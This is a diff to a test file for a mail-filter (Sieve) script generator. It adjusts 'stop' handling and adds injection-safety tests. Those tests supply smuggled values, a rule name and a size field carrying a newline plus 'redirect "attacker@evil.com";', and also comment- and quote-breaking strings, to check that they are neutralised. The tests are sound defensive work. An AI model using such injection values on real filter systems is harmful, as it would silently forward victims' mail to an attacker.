@@ -236,22 +236,22 @@ describe('generateScript', () => {
       expect(matches).toHaveLength(1);
     });
 
-    it('does not append stop after discard', () => {
+    it('appends stop after discard when stopProcessing is set', () => {
       const script = generateScript([makeRule({
         actions: [{ type: 'discard' }],
         stopProcessing: true,
       })]);
-      const matches = script.match(/stop;/g);
-      expect(matches).toBeNull();
+      const ifBlock = script.slice(script.indexOf('if '));
+      expect(ifBlock).toMatch(/discard;\s*\n\s*stop;/);
     });
 
-    it('does not append stop after reject', () => {
+    it('appends stop after reject when stopProcessing is set', () => {
       const script = generateScript([makeRule({
         actions: [{ type: 'reject', value: 'No' }],
         stopProcessing: true,
       })]);
-      const matches = script.match(/stop;/g);
-      expect(matches).toBeNull();
+      const ifBlock = script.slice(script.indexOf('if '));
+      expect(ifBlock).toMatch(/reject "No";\s*\n\s*stop;/);
     });
   });
 
@@ -386,6 +386,56 @@ describe('generateScript', () => {
       const result = parseScript(script);
       expect(result.isOpaque).toBe(false);
       expect(result.rules).toEqual(rules);
+    });
+  });
+
+  describe('injection safety', () => {
+    it('does not let a newline in a rule name emit a live redirect', () => {
+      const script = generateScript([makeRule({
+        name: 'Innocent\nredirect "attacker@evil.com";',
+      })]);
+      const hasLiveRedirect = script
+        .split('\n')
+        .some(line => line.trim().startsWith('redirect "attacker@evil.com"'));
+      expect(hasLiveRedirect).toBe(false);
+    });
+
+    it('does not let */ in a rule name close the metadata comment', () => {
+      const rules = [makeRule({ name: 'a*/b' })];
+      const script = generateScript(rules);
+      const metaBlock = script.slice(
+        script.indexOf('/* @metadata:begin'),
+        script.indexOf('@metadata:end */'),
+      );
+      expect(metaBlock).not.toContain('*/');
+
+      const result = parseScript(script);
+      expect(result.isOpaque).toBe(false);
+      expect(result.rules[0].name).toBe('a*/b');
+    });
+
+    it('sanitizes a custom header name so it cannot break out of the quoted string', () => {
+      const script = generateScript([makeRule({
+        conditions: [{ field: 'header', comparator: 'contains', value: 'x', headerName: 'X" "From' }],
+      })]);
+      expect(script).not.toContain('header :contains "X" "From"');
+      expect(script).toContain('header :contains "XFrom" "x"');
+    });
+
+    it('keeps only a number and optional K/M/G suffix in a size condition', () => {
+      const script = generateScript([makeRule({
+        conditions: [{ field: 'size', comparator: 'greater_than', value: '1024;\nredirect "attacker@evil.com";' }],
+      })]);
+      expect(script).toContain('size :over 1024');
+      const hasLiveRedirect = script
+        .split('\n')
+        .some(line => line.trim().startsWith('redirect "attacker@evil.com"'));
+      expect(hasLiveRedirect).toBe(false);
+
+      const withSuffix = generateScript([makeRule({
+        conditions: [{ field: 'size', comparator: 'less_than', value: '2m' }],
+      })]);
+      expect(withSuffix).toContain('size :under 2M');
     });
   });
 
